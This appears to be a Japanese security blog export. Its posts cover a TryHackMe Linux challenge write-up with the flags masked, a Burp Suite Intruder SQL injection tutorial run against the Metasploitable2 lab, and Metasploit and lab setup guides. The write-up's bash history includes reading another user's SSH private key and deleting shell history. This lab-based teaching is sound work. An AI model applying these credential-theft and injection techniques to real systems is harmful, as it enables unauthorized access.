Challengesを解いてみたので、そちらのWriteUPを記事にしたいと思います。\n量が多いため、何回かに分けてWriteUPを記していきたいと思います。\nまだ解いていない人や、これから解いてみたいという人は、ブラウザバックしてください。\nまた、この記事には直接Flagの値は記載していません。自分の手で実際に実行してFlagの奪取をしてください。\nそれでは、やっていきましょう。\nWrite UP Task 1 Linux Challenges Introduction TryHackMeでは、今回学ぶ大章をRoomと呼んでいます。\n今回のRoomでは、Linuxの基本的なスキルを学びながらFlagを奪取していくことになります。\n自分は仮想環境にあるParrot Security OSを立ち上げ、VPN接続をした後、SSHにてRoomのマシンに接続しています。\nParrot Securityの環境構築方法については、以前ブログ記事にしているので、そちらを参考にしてみてください。\n  https://blog.yuk1h1ra.me/posts/2020/09/install-parrot-security-os/\n How many visible files can you see in garrys home directory? こちらは簡単ですね。ディレクトリ内のファイルの数を答えればOKです。\n1 2  garry@ip-10-10-14-129:~$ ls flag1.txt flag24 flag29   Task 2 The Basics What is flag 1? flag1の内容を読み取ってあげればFlag1がわかりました。\n1 2 3 4 5 6 7 8 9  garry@ip-10-10-14-129:~$ cat flag1.txt There are flags hidden around the file system, its your job to find them. Flag 1: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Log into bobs account to get flag 2. Username: bob Password: xxxxxxxxxx   Log into bob\u0026rsquo;s account using the credentials shown in flag 1 flag1.txtに書かれているbobにログインし、次項からはbobで実行していきます。\nWhat is flag 2? とりあえず、bobのホームディレクトリを確認したら、flag2.txtがあったので、そちらを読み取ってFlagゲットです\n1 2 3 4 5  bob@ip-10-10-14-129:~$ ls Desktop Documents Downloads flag13 flag21.php flag2.txt flag8.tar.gz Music Pictures Public Templates Videos bob@ip-10-10-14-129:~$ cat flag2.txt Flag 2: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Flag 3 is located where bob\u0026rsquo;s bash history gets stored bobのbash histroyを見ればいいとのことで、自分はhistoryコマンドで確認したら１行目にありました。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  bob@ip-10-10-14-129:~$ history 1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 2 cat ~/.bash_history 3 rm ~/.bash_history 4 vim ~/.bash_history 5 exit 6 ls 7 crontab -e 8 ls 9 cd /home/alice/ 10 ls 11 cd .ssh 12 ssh -i .ssh/id_rsa alice@localhost 13 exit 14 ls 15 cd ../alice/ 16 cat .ssh/id_rsa 17 cat /home/alice/.ssh/id_rsa 18 exit 19 cat ~/.bash_history 20 exit 21 cd 22 ls 23 cat flag2.txt 24 history   Flag 4 is located where cron jobs are created cronについてですが、自分はcronは触ったことはあるけどよくわからない状態でしたのでmanページなどで確認していました。\ncrontab -eで現在のcrontabを編集できるため、そちらを確認したところFlagが書いてありました。\n1 2  bob@ip-10-10-14-129:~$ crontab -e No modification made   Find and retrieve flag 5 flag5を探せとのことで、とりあえずfindで検索してみたら該当するのがありました。\n1 2 3 4  bob@ip-10-10-14-129:~$ find / 2\u0026gt;/dev/null | grep flag5 /lib/terminfo/E/flag5.txt bob@ip-10-10-14-129:~$ cat /lib/terminfo/E/flag5.txt xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   \u0026ldquo;Grep\u0026rdquo; through flag 6 and find the flag. The first 2 characters of the flag is c9 Flag5の応用です。flag6.txtは膨大な量のテキストデータですので、うまくgrepしてあげることで奪取することができました。\n1 2  bob@ip-10-10-14-129:~$ find / 2\u0026gt;/dev/null | grep flag6 /home/flag6.txt   Look at the systems processes. What is flag 7 プロセス中にFlagが含まれているとのことで、それの確認をしました。\ntop/htopで探す方法もあると思いますが、自分はpsコマンドで探しちゃいました。\n1 2 3  bob@ip-10-10-14-129:~$ ps aux | grep flag root 1394 0.0 0.0 6008 264 ? S Nov09 0:00 flag7:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 1000000 bob 3274 0.0 0.0 12944 940 pts/1 S+ 00:55 0:00 grep --color=auto flag   De-compress and get flag 8 .tar.gzの解凍方法がわかるか？って問題です。\nbobのホームディレクトリにflag8.tar.gzがあるのを確認します。\n1 2  bob@ip-10-10-14-129:~$ ls Desktop Documents Downloads flag13 flag21.php flag2.txt flag8.tar.gz Music Pictures Public Templates Videos   最悪、「tar.gz 解凍」とかで検索すると出てくるので、それで対応でもいいですね。\n1 2  bob@ip-10-10-14-129:~$ tar -zxvf flag8.tar.gz flag8.txt   By look in your hosts file, locate and retrieve flag 9 Linuxのhostsファイルは/etc/hostsにあります。\n確認してみると、127.0.0.1にflagと思わしき文字列が追加されていたのでそれでflagゲットです。\n1 2 3 4 5 6 7 8 9 10 11 12  bob@ip-10-10-14-129:~$ cat /etc/hosts 127.0.0.1 localhost # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3 ip6-allhosts 127.0.0.1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.com   Find all other users on the system. What is flag 10 Linuxシステムでのすべてのユーザは/etc/passwdに記載されています。\n確認してみたところ変な名前のユーザがいたため、そちらがフラグになります。\n1 2 3 4  bob@ip-10-10-14-129:~$ cat /etc/passwd (中略) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx❌1002:1002:,,,:/home/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:/bin/bash (中略)   Task 3 Linux Functionality Run the command flag11. Locate where your command alias are stored and get flag 11 flag11コマンドを実行してみろとあったので、とりあえず実行。\n1 2  bob@ip-10-10-14-129:~$ flag11 You need to look where the alias are created...   エイリアスの話になってきたので、.bashrcを確認してみてflagゲット。\n1 2 3 4 5 6 7  bob@ip-10-10-14-129:~$ cat .bashrc (中略) #custom alias alias flag11=\u0026#39;echo \u0026#34;You need to look where the alias are created...\u0026#34;\u0026#39; #xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (中略)   Flag12 is located were MOTD\u0026rsquo;s are usually found on an Ubuntu OS. What is flag12? MOTD\u0026rsquo;sってなんだ？と思い、とりあえず検索。\nすると、ログインした際に表示されるメッセージだということがわかりました。\nmanページやgoogle先生の力を借りて、表示するメッセージがどこに保存されているのかを確認し、grepしちゃいました。\n1 2  bob@ip-10-10-14-129:~$ cat /etc/update-motd.d/* | grep Flag # Flag12: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Find the difference between two script files to find flag 13 ２つのファイルの相違点を確認しろってことでしたので、diffコマンドで一発でした。\n1 2 3 4  bob@ip-10-10-14-129:~$ cd flag13/ bob@ip-10-10-14-129:~/flag13$ ls script1 script2 bob@ip-10-10-14-129:~/flag13$ diff script1 script2   1 2 3 4  2437c2437 \u0026lt; Lightoller sees Smith walking stiffly toward him and quickly goes to him. He yells into the Captain\u0026#39;s ear, through cupped hands, over the roar of the steam... --- \u0026gt; Lightoller sees xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Smith walking stiffly toward him and quickly goes to him. He yells into the Captain\u0026#39;s ear, through cupped hands, over the roar of the steam...   Where on the file system are logs typically stored? Find flag 14 Linuxでは、ログファイルは基本的に/var/logにあります。\n確認してみたところ、それっぽいファイルflagtourteen.txt(Typo or grep避け)がありました。\n1 2 3 4 5  bob@ip-10-10-14-129:~$ ls /var/log/ alternatives.log apt btmp cups flagtourteen.txt gpu-manager.log kern.log.2.gz speech-dispatcher syslog.3.gz Xorg.0.log alternatives.log.1 auth.log btmp.1 dist-upgrade fontconfig.log hp lastlog syslog unattended-upgrades Xorg.0.log.old amazon auth.log.1 cloud-init.log dpkg.log fsck kern.log lxd syslog.1 wtmp xrdp-sesman.log apache2 auth.log.2.gz cloud-init-output.log dpkg.log.1 gdm3 kern.log.1 mysql syslog.2.gz wtmp.1   Find flag 15  Can you find information about the system, such as the kernel version etc.\n flag15の設問の前にヒントが記されていました。\n自分は最初os-releaseを確認したのですが見つからず、侵入しているマシンがubuntuであったことからlsb-releaseを確認したところflagをゲットすることができました。\n1 2 3 4 5 6  bob@ip-10-10-14-129:~$ cat /etc/lsb-release FLAG_15=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.04 DISTRIB_CODENAME=xenial DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 16.04.5 LTS\u0026#34;   Flag 16 lies within another system mount 自分が普段マウントする時は/mntにマウントしていたため、そちらを確認していたのですが、/media/にありましたね。\n考え方は、マウントするときと同じです。\n1 2 3 4  bob@ip-10-10-14-129:~$ cd /media/ bob@ip-10-10-14-129:/media$ ls f bob@ip-10-10-14-129:/media$ cd f/l/a/g/1/6/is/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/   Login to alice\u0026rsquo;s account and get flag 17. Her password is TryHackMe123 今度はaliceにログインし、そこからflagをゲットするみたいです。\naliceのホームディレクトリに移動し、flagをゲットしました。\n1 2 3 4 5 6 7 8 9  bob@ip-10-10-14-129:~$ su alice - Password: bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell alice@ip-10-10-14-129:/home/bob$ cd alice@ip-10-10-14-129:~$ ls flag17 flag19 flag20 flag22 flag23 flag32.mp3 alice@ip-10-10-14-129:~$ cat flag17 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Find the hidden flag 18 hidden fileときたので、適当にホームディレクトリ配下をすべて表示させたらありました。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  alice@ip-10-10-14-129:~$ ls -al total 172 drwxr-xr-x 4 alice alice 4096 Feb 20 2019 . drwxr-xr-x 6 root root 4096 Feb 20 2019 .. -rw------- 1 alice alice 518 Mar 7 2019 .bash_history -rw-r--r-- 1 alice alice 220 Feb 18 2019 .bash_logout -rw-r--r-- 1 alice alice 3771 Feb 18 2019 .bashrc drwx------ 2 alice alice 4096 Feb 18 2019 .cache -rw-rw-r-- 1 alice alice 33 Feb 18 2019 flag17 -rw-rw-r-- 1 alice alice 33 Feb 18 2019 .flag18 -rw-rw-r-- 1 alice alice 99001 Feb 19 2019 flag19 -rw-rw-r-- 1 alice alice 45 Feb 19 2019 flag20 -rw-rw-r-- 1 alice alice 96 Feb 19 2019 flag22 -rw-rw-r-- 1 alice alice 33 Feb 19 2019 flag23 -rw-rw-r-- 1 alice alice 10560 Feb 19 2019 flag32.mp3 -rw------- 1 alice alice 32 Feb 19 2019 .lesshst -rw-r--r-- 1 alice alice 655 Feb 18 2019 .profile drw-r--r-- 2 alice alice 4096 Mar 7 2019 .ssh -rw------- 1 alice alice 3075 Feb 19 2019 .viminfo alice@ip-10-10-14-129:~$ cat .flag18 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Read the 2345th line of the file that contains flag 19 flag19の2345行目を読めとのことでしたので、-nオプションをつけて行数を表示し、そこからgrepしちゃいました。\n2141行目が表示されているのは、内容に2345という文字列が含まれているからです。\nまた、Hintにはsedコマンドを使えと書いてあったのですが、自分はこの方法で溶けちゃいました。(sedコマンドイマイチよくわからない)\n1 2 3  alice@ip-10-10-14-129:~$ cat -n flag19 | grep 2345 2141 ac01e02345063d870cbf2aa7ee1077e6 2345 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   終わりに 今回は、Try Hack MeのLinux ChallengesをTask3までとき終わることができました。\nブログにWriteUPを書くため、作業ログを取りながら解いていく形になり、結果としてTask3を終えるまで合計2時間くらいかかってしまいました。\n普段からLinuxを使っている方や、Linuxの操作に慣れている方なら簡単に解くことができると思いますし、これからLinuxを学んでいく/学びたいと思っている人も前RoomにてLinuxについて学ぶことができるため、復習を兼ねてサクサクっと解いてみることをオススメします。\nTask4以降のWriteUPも随時掲載予定です。\n","description":"","id":10,"section":"posts","tags":["writeup","ctf","tryhackme"],"title":"【THM: Try Hack Me】Linux Challengesを解いてみた - Part1【WriteUP】","uri":"https://blog.yuk1h1ra.me/posts/2020/11/thm-linux-challenges-writeup-part1/"},{"content":"Who am I 当ブログを管理しているYuk1h1raです。\nアイコンがジェイソンマスクですが、ホラーが大の苦手です。もちろん13日の金曜日なんて、怖くて見られません。\n大学ではコンピュータ・サイエンス(CS)を専攻し、在学中に基本情報・応用情報を取得しました。四年次には情報セキュリティの研究室に所属し、マルウェア対策ワークショップであるMWSに、マルウェアの動的解析チームとして参加しました。卒業論文ではPGPにおける脆弱性についての研究を行いました。\n何かご意見・ご要望がありましたら、下記フッターにあるTwitterのDMに連絡ください。\nWhat\u0026rsquo;s this blog 当ブログではセキュリティツールの使い方や、CTFのWriteUP、覚えておいたほうが良いTipsなど、サイバーセキュリティに関する事柄ついて掲載しています。ブログ記事を読む前に 免責事項 を一読し、不正アクセス禁止法に触れないようお願いいたします。\nサイバーセキュリティを学ぶ人達の手助けになれれば幸いです。\n","description":"","id":11,"section":"","tags":null,"title":"About","uri":"https://blog.yuk1h1ra.me/about/"},{"content":"始めに 自分はParrot Security OSを仮想環境下で使用しています。その時にBurpSuiteのWebレンダリング機能がうまく機能していなかったため、その解決方法を記事にしました。\nエラーが起きた際のバージョンを以下に乗せておきます。\n Parrot Security OS: 4.1.0 Burp Suite: 2020.9.1-3995 Burp Suite Community Edition  問題点 Burp SuiteのResponseにて、RenderタブでWebページを表示させようとした際に、Unable to render response や Embedded browser initialization failed のエラーが表示され、Webページを表示されていないことがありました。\n解決法 Burp Suiteの開発元であるPortSwiggerがTwitterにて解決法をツイートしていました。\nHi, if you are running as root are you able to turn off the sandbox under Project options -\u0026gt; Misc -\u0026gt; Embedded Browser -\u0026gt; Allow the embedded browser to run without a sandbox?\n\u0026mdash; Burp Suite (@Burp_Suite) August 18, 2020   https://twitter.com/Burp_Suite/status/1295619292667543552?ref_src=twsrc%5Etfw\n つまり、\nProject options -\u0026gt; Misc -\u0026gt; Embedded Browser -\u0026gt; Allow the embedded browser to run without a sandbox\nにの順にチェックを入れてあげます。\nこれで正しく表示されるようになりました。\n終わりに BurpSuiteを用いて脆弱性診断をする際に、目に見える形で確認したい場合が多々あります。\n今後このようなエラーが起きた際に、この記事が参考になって解決されることを祈っています。\n","description":"","id":12,"section":"posts","tags":["burpsuite","bugbounty","bugfix"],"title":"BurpSuiteのRenderでUnable to render responseが出るときの解決法","uri":"https://blog.yuk1h1ra.me/posts/2020/10/burpsuite-unable-to-render-response/"},{"content":"始めに Webアプリケーションの脆弱性診断をする際にプロキシツールを持ちいて診断をしているかと思います。\n今回はBurpSuiteとWfuzzのwordlistを用いてSQLインジェクションの脆弱性診断の方法を紹介したいと思います。\n脆弱性を含んだマシンの用意 今回はMetasploitable2を用いります。\n以下のサイトからDownloadし、Virtualbox上に構築してください。\n  https://sourceforge.net/projects/metasploitable/\n 構築が終わったらネットワークの設定をしてあげます。\n設定を開き、ネットワークからNATネットワークのチェックを外します。\nアダプター２にチェックをいれて、ホストオンリーアダプターを選択してあげます。\n名前は自分の環境ではvboxnet2です。攻撃用のマシンも同様にホストオンリーアダプターのネットワークを有効にしてください。\n起動したらusernameとpasswordを聞かれますので、どちらも msfadmin でログインします。\nコンソール画面で以下のコマンドでMetasploitable2のIPアドレスを確認します。\ninet addrに続くIPアドレスを確認しておきます。\n1 2 3 4 5  $ ifconfig eth0 (中略) inet addr:172.28.128.X Bcast:172.28.128.255 Mask:255.255.255.0 (中略)   ここまで出来ればMetasploitable2の設定は終了です。\n攻撃用マシンでの作業 ブラウザの設定 先程確認したIPアドレスをブラウザで開きます。\nMutillidaeをクリックします。\nMutillidaeとはOWASP Foundationが提供している、意図的に脆弱なWebアプリケーションになります。\n次に左のメニューから、OWASP Top 10 =\u0026gt; A1 Injection =\u0026gt; SQLi Extract Data =\u0026gt; User Infoを選択してください。\nこちらの画面でSQLインジェクションを行っていきます。\nfoxyproxyの設定 Firefoxの拡張機能であるfoxyproxyがとても便利なのでそちらでプロキシの設定をしてきます。\nFoxyProxyの設定からAddをクリックし、必要な情報を入力していきます。\n今回は以下のように設定しました\n Title: Metasploitable2 Proxy IP: 127.0.0.1 Port: 8080  その後、Save \u0026amp; Edit Patternsをクリックし、Metasploitable2のIPアドレスを設定してSaveします。\n設定が完了したら、先程の画面からMetasploitable2を選択してあげます。\nBurpSuiteの設定 BurpSuiteを開きProxyタブのInterceptをOffにしておきます。\nブラウザをリロードすることで、HTTP historyにきちんと表示されていることを確認してください。\nSQLインジェクション それでは、実際にブラウザでusername:passwordを入力してみましょう。\nすると、エラー文が表示されたと思います。\n今回のWebアプリケーションでは、UsernameとPasswordの組が存在していないとError文が表示される形となっています。\nBurpSuiteを開き、usernameとpasswordを入力したものをIntruderに送りましょう。\nIntruderタブのPositionsにてusernameのみを追加しましょう。\nusernameのみ$で囲まれていれば正解です。\nそれではwfuzzのwordlistを使っていきましょう。\nParrot Security OSを使用しているのであれば、/usr/share/wordlists/wfuzz/injections/SQL.txt というのがあるので、今回はそれを使用していきます。\nPayloadsタブから、Payloads OptionsのLoadから先程のwordlistを選択してあげます。\n右上のStart Attackをしてあげると順次結果が表示されていきます。\nおわりに 今回はwordlistを用いてBurpSuiteのIntruder機能を使ってSQLインジェクションを行いました。\nこれによってSQLインジェクションの確認を手打ちでするのではなく、予め用意しておいたものをloadすることで作業効率のアップが見込まれます。\nしかし、BugBountyなどでは自動でのリクエストを禁止している場合があるため、ルールをよく読んだ上で実行することを勧めます。\n","description":"","id":13,"section":"posts","tags":["burpsuite","wfuzz","bugbounty"],"title":"BurpSuiteとWfuzzのwordlistを用いてSQLインジェクションをしてみた","uri":"https://blog.yuk1h1ra.me/posts/2020/10/burpsuite-wfuzz-sqlinjection/"},{"content":"始めに 脆弱性診断やペネトレーションでよく話題にあげられるMetasploit Frameworkですが、初心者講座などを見てもコマンドの使い方などが部分的に解説してあるだけで本質的な部分が分かりづらいブログ記事が多かったため、自分が実際に調べていてこれは使えそうだというものを幾つかピックアップしてみました。\n想定読者としては、Metasploit Frameworkというものはなんなのかというのをふんわりと理解しているが、実際に使用したことはなく学習したいと考えている初学者を対象としています。\nTryHackMe   https://tryhackme.com/room/rpmetasploit\n TryHackMeというセキュリティ学習サイトにあるMetasploitのRoomになります。\n実際に手を動かしながら学ぶことができるため、最初の取っ掛かりとして学習するのに向いていると思います。\n自分もここのTryHackMeから入り、わからない部分や曖昧な部分を下記のMetasploit Unleashedで確認をしているところです。\nMetasploit Unleashed   https://www.offensive-security.com/metasploit-unleashed/\n Offensive Securityが無料で公開しているMetasploit Frameworkのコースになります。\nMetasploit Frameworkについて体系的にまとめられており、自分がおすすめする中で一番の良い教材だと思っています。\nGithub Wiki   https://github.com/rapid7/metasploit-framework/wiki\n 開発元のRapid7のリポジトリにあるMetasploit FrameworkのWikiになります。\nMetasploit Frameworkの導入方法からHow toまで最新の情報が並んでいるため、こちらも活用するといいと思います。\n","description":"","id":14,"section":"posts","tags":["bugbounty","metasploit"],"title":"Metasploit Frameworkを初心者が学習するのに役立つサイト集","uri":"https://blog.yuk1h1ra.me/posts/2020/10/metasploit-framework/"},{"content":"Metasploitable3 とは Metasploitable3はわざと脆弱性をもたせたマシンです。このマシンに対してToolの検証やexploitを行います。\n普段ペンテストの勉強などをしている際に、有用なツールを見つけたとしてもぶっつけ本番で行うわけには行きません。\nテストをする場所を作り、そこで使い方の勉強をしていったほうがいいです。\n  https://github.com/rapid7/metasploitable3\n 環境構築 構築環境＆バージョン それでは、metasploitable3の環境を構築していきます。\n自分の環境とそれらのバージョンは以下の通りです。\n Host OS: Manjaro Linux x86_64 VirtualBox: 6.1.14 Vagrant: 2.2.10 Packer: 1.6.2  基本的にはgithubに書いてあることをなぞっていくので、よく読んでおくことを勧めます。\nインストール Packer Install Packerのインストールです。\n自分はManjaro Linuxを使っているのでpacmanで一発で入ります。\n1  sudo pacman -S packer   Vagrant Install ありがたいことにvagrantもありました。\nこちらもインストールしていきます。\n1  sudo pacman -S vagrant   Vagrant Reload Plugin Install vagrantのプラグインであるVagrant Reload Pluginをインストールしていきます。\n1  vagrant plugin install vagrant-reload   ここまでは下準備です。\nそれではMetasploitableの環境を構築していきます。\nMetasploit3 Install 今回はrapid7で提供されているビルド済みのイメージを使います。\n自身でビルドする場合もgithubページに書いてあるのでそちらをなぞって構築してもいいでしょう。\n1 2 3  mkdir metasploitable3-workspace cd metasploitable3-workspace curl -O https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile \u0026amp;\u0026amp; vagrant up   ただ、2020年9月現在では、Windowsの環境構築の際にエラーが吐かれてしまい、止まってしまいました。\nHow to Fix 止まってしまったときのエラー分が以下になります。\n1 2 3 4 5 6 7  There was an error loading a Vagrantfile. The file being loaded and the error message are shown below. This is usually caused by an invalid or undefined variable. Path: /home/username/.vagrant.d/boxes/rapid7-VAGRANTSLASH-metasploitable3-win2k8/0.1.0-weekly/virtualbox/Vagrantfile Line number: 0 Message: undefined local variable or method `win2k8\u0026#39;   win2k8がないみたいなことを言われていますね。\n調べてみると解決法が見つかりました。\nここからは推測になりますが、rapid7にて提供されているVagrantfileが若干古いor名前が違うみたいで、最初にダウンロードしたVagrantfileとの整合性があっていないように感じます。\nそこをちょちょちょいと修正してあげるとうまく行きます。\n  https://github.com/rapid7/metasploitable3\n Vagrantfileの編集を行います。\n1  nvim ~/.vagrant.d/boxes/rapid7-VAGRANTSLASH-metasploitable3-win2k8/0.1.0-weekly/virtualbox/Vagrantfile   編集後のファイルの中身が以下になります。\n# The contents below were provided by the Packer Vagrant post-processor Vagrant.configure(\u0026quot;2\u0026quot;) do |config| config.vm.base_mac = \u0026quot;080027D0BF18\u0026quot; end # The contents below (if any) are custom contents provided by the # Packer template during image build. # -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.require_version \u0026quot;\u0026gt;= 1.6.2\u0026quot; Vagrant.configure(\u0026quot;2\u0026quot;) do |config| config.vm.synced_folder '.', '/vagrant', disabled: true config.vm.define \u0026quot;win2k8\u0026quot; do |win2k8| win2k8.vm.box = \u0026quot;rapid7/metasploitable3-win2k8\u0026quot; win2k8.vm.hostname = \u0026quot;metasploitable3-win2k8\u0026quot; config.vm.communicator = \u0026quot;winrm\u0026quot; # Admin user name and password config.winrm.username = \u0026quot;vagrant\u0026quot; config.winrm.password = \u0026quot;vagrant\u0026quot; config.vm.guest = :windows config.windows.halt_timeout = 15 config.vm.network :forwarded_port, guest: 3389, host: 3389, id: \u0026quot;rdp\u0026quot;, auto_correct: true config.vm.network :forwarded_port, guest: 22, host: 2222, id: \u0026quot;ssh\u0026quot;, auto_correct: true config.vm.provider :virtualbox do |v, override| #v.gui = true v.customize [\u0026quot;modifyvm\u0026quot;, :id, \u0026quot;--memory\u0026quot;, 2048] v.customize [\u0026quot;modifyvm\u0026quot;, :id, \u0026quot;--cpus\u0026quot;, 2] v.customize [\u0026quot;setextradata\u0026quot;, \u0026quot;global\u0026quot;, \u0026quot;GUI/SuppressMessages\u0026quot;, \u0026quot;all\u0026quot; ] v.customize [\u0026quot;modifyvm\u0026quot;, :id, \u0026quot;--clipboard\u0026quot;, \u0026quot;bidirectional\u0026quot;] end config.vm.provider :vmware_fusion do |v, override| #v.gui = true v.vmx[\u0026quot;memsize\u0026quot;] = \u0026quot;2048\u0026quot; v.vmx[\u0026quot;numvcpus\u0026quot;] = \u0026quot;2\u0026quot; v.vmx[\u0026quot;ethernet0.virtualDev\u0026quot;] = \u0026quot;vmxnet3\u0026quot; v.vmx[\u0026quot;RemoteDisplay.vnc.enabled\u0026quot;] = \u0026quot;false\u0026quot; v.vmx[\u0026quot;RemoteDisplay.vnc.port\u0026quot;] = \u0026quot;5900\u0026quot; v.vmx[\u0026quot;scsi0.virtualDev\u0026quot;] = \u0026quot;lsilogic\u0026quot; end config.vm.provider :vmware_workstation do |v, override| #v.gui = true v.vmx[\u0026quot;memsize\u0026quot;] = \u0026quot;2048\u0026quot; v.vmx[\u0026quot;numvcpus\u0026quot;] = \u0026quot;2\u0026quot; v.vmx[\u0026quot;ethernet0.virtualDev\u0026quot;] = \u0026quot;vmxnet3\u0026quot; v.vmx[\u0026quot;RemoteDisplay.vnc.enabled\u0026quot;] = \u0026quot;false\u0026quot; v.vmx[\u0026quot;RemoteDisplay.vnc.port\u0026quot;] = \u0026quot;5900\u0026quot; v.vmx[\u0026quot;scsi0.virtualDev\u0026quot;] = \u0026quot;lsisas1068\u0026quot; end win2k8.vm.provider \u0026quot;libvirt\u0026quot; do |v| v.memory = \u0026quot;2048\u0026quot; v.cpus = \u0026quot;2\u0026quot; v.video_type = 'qxl' v.input :type =\u0026gt; \u0026quot;tablet\u0026quot;, :bus =\u0026gt; \u0026quot;usb\u0026quot; v.channel :type =\u0026gt; 'unix', :target_name =\u0026gt; 'org.qemu.guest_agent.0', :target_type =\u0026gt; 'virtio' v.channel :type =\u0026gt; 'spicevmc', :target_name =\u0026gt; 'com.redhat.spice.0', :target_type =\u0026gt; 'virtio' v.graphics_type = \u0026quot;spice\u0026quot; # Enable Hyper-V enlightenments: https://blog.wikichoon.com/2014/07/enabling-hyper-v-enlightenments-with-kvm.html v.hyperv_feature :name =\u0026gt; 'stimer', :state =\u0026gt; 'on' v.hyperv_feature :name =\u0026gt; 'relaxed', :state =\u0026gt; 'on' v.hyperv_feature :name =\u0026gt; 'vapic', :state =\u0026gt; 'on' v.hyperv_feature :name =\u0026gt; 'synic', :state =\u0026gt; 'on' end end end 最後に立ち上げて終了です。\n1  vagrant up   ネットワーク設定 自分の環境では、VirtualBoxで攻撃用のマシンを構築しています。\n攻撃用のマシンの構築手順ですが、記事にしてあるのでこちらを参考にしてみてください。\n  https://blog.yuk1h1ra.me/posts/2020/09/install-parrot-security-os/\n いま作ったMetasploitableとのネットワークの設定をしてあげます。\n攻撃用のマシンの設定を開き、ネットワークからホストオンリーアダプタを選択します。\nネットワークはMetasploitable3と同じネットワークにしてあげて完了です。\nおわりに 今回は脆弱性をあえてもたせた仮想マシンの紹介と構築方法についてまとめました。\nこのマシンを使って、ペンテストツールの検証や、自身の勉強に役立てていこうと思います。\n","description":"","id":15,"section":"posts","tags":["bugbounty","tools"],"title":"Metasploitable3の環境構築","uri":"https://blog.yuk1h1ra.me/posts/2020/09/metasploitable3/"},{"content":"Parrot Security OS とは Parrot Security OSはイタリアで開発が行われている、セキュリティとプライバシーを念頭に置いて設計されたDebianベースのGNU/Linuxです。\nペネトレーションテストから、デジタルフォレンジック、リバースエンジニアリングまで、あらゆる種類のサイバーセキュリティ運用のためのツールが含まれています。\nKali Linuxとの違い Kali Linuxとどっちがより良いかなどよく比較されます。\n基本的に含まれているツール群はKaliにあったらParrotにもあります。\nKaliはペネトレーションテストに特化したOSなのに対し、ParrotはHOME版も出しており、普段使いにもできるような印象があります。\nまた、「AnonSurf」というすべての通信をTorを用いて通信を行うようにするアプリケーションは、Kaliにはデフォルトでインストールされていないため、その点ではKaliに勝っています。\nまた、デスクトップ環境にも違いがあります。\nKali LinuxではGnomeを、ParrotではMATEを採用しています。\nVirtualBox上で動かす上で、限られたリソースで動作させなくてはいけないため、軽いデスクトップ環境のMATEのほうが無難です。\n海外のコミュニティなどでも検索をかけてみましたが、Parrotを好んで使っている、Parrotを勧めているようなコメントもありました。\n今までごたごたと語ってきましたが、結局は見た目と好みで選んでいいと思います。\nインストール ISOダウンロード まずはParrotのホームページから、isoをダウンロードしてきてください。\n  https://parrotlinux.org/download/\n MATE版、KDE版、OVA版がありますが、自分で一から設定したいためOVA版はパス。\nMATEとKDEですが、ノートPCなどに直接インストールするのであればKDEもありです。\n自分も普段使いのManjaroLinuxは、KDEを採用しています。\nしかし、VM上に展開するには重い印象があります。\nあと、MATE版はとても綺麗に作られていたのですが、KDE版のデスクトップほとんどデフォルトって感じであまり好みではなかったです。\nKDE版にはそこまで力をいれていないのかなって印象です。\nVirualBoxのマシン作成 1. 新規作成 新しい仮想マシンを作成します。\n2. 名前とオペレーティングシステム 適当に好きな名前をつけます\n3. メモリーサイズ メモリサイズを設定します。\nメモリが2GBとかの化石PCを使ってる人なんてもういないと思うので、4GBとか8GBとか当ててください。\n4.1 ハードディスク 新しく仮想ハードディスクを選択してください。\n4.2 ハードディスクのファイルタイプ 提案されているものそのままで大丈夫です。\n4.3 物理ハードディスクにあるストレージ 書いてあるとおりです。\n今回は可変で作成しますが、固定でもいいです。\nぶっちゃけどちらでもいいです。\n4.4 ファイルの場所とサイズ 自分がいま使っている状況で20GB程度使用しているため、それ以上は絶対必要です。\n自身の空き容量と相談してください。\n無事、新しくマシンが作成されました。\n次は設定に移ります。\nVirtualBoxのマシン設定 一般 高度タブからクリップボード、ドラッグアンドドロップを双方向にしてください。\n後にGuestAdditionsを導入した際に便利になります。\nシステム チップセットをICH9、ポインティングデバイスをUSBマルチタブレットにしてください。\nこれが一番最新の設定らしいです。\nこれが原因で動かないとかはないですが、しておいて損はないです。\nプロセッサ 自分はホストの半分のプロセッサ数を割り振ってます。\nまた、PAE/NXを有効化しておいてください。\nディスプレイ ビデオメモリですが、ディスプレイ数が1の時は128MBが最大です。\nビデオメモリを増やしてあげると、256MBまで増えます。\nワザップですね。\nちなみに、3Dアクセラレーションにもチェックを入れておいてください。\nストレージ ここからディスクファイルを選択し、Parrotのisoイメージを選択してあげてください。\n先程空だったところにisoイメージが挿入されていると思います。\nLive CD/DVDにチェックをいれます。\n一度OKを押し、設定を終了します。\nRe:スクリーン このままではスクリーン数が8のままなので、それを1つにしていきます。\nスクリーン数を変更してもビデオメモリは256MBのままですね！\nグラフィックコントローラー 起動する前に、グラフィックコントローラを変更します。\nこの画面のVMSVGAというところをクリックし、VBoxSVGAを選択してあげます。\nこれで起動する準備が整いました。\n起動しましょう。\n仮想マシンの起動 